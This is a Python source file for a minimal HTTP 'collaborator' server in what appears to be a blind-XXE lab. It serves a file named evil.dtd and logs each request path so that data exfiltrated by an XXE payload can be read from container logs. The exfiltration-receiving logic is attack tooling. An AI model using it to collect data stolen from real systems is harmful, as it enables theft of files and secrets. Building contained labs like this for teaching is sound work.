"""
xxe-basic-collab: tiny logging HTTP server.

Serves /evil.dtd from disk on every GET. For every other path, returns a
1x1 empty 200 response. Either way, the full request line (method, path,
query string) is written to stdout so `docker compose logs` reveals
whatever the blind-XXE payload exfiltrated into the URL.

Bound to 0.0.0.0:80 inside the container. The compose definition does
NOT publish this port to the host; the only thing that can reach it is
the sibling lab container on the internal Docker network. That is
deliberate, the blind-XXE scenario depends on out-of-band egress from
the victim container to the collaborator.
"""

import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

DTD_PATH = Path("/srv/evil.dtd")


class Handler(BaseHTTPRequestHandler):
    def _log(self, msg: str) -> None:
        # Print directly to stdout, unbuffered, so docker logs shows it
        # without waiting for the default BaseHTTPRequestHandler stderr
        # buffering to flush.
        print(msg, flush=True)

    def log_message(self, fmt, *args):
        # Silence the default stderr access log; we emit our own line in
        # do_GET so the format is stable and the data is easy to grep.
        return

    def do_GET(self):
        client = self.client_address[0]
        self._log(f"[collab] GET from {client} path={self.path}")

        if self.path.startswith("/evil.dtd"):
            body = DTD_PATH.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # Any other path: empty 200. The fact that we got here is the
        # signal; the path itself carries the exfiltrated data.
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "0")
        self.end_headers()


def main() -> int:
    server = ThreadingHTTPServer(("0.0.0.0", 80), Handler)
    print("[collab] listening on 0.0.0.0:80", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
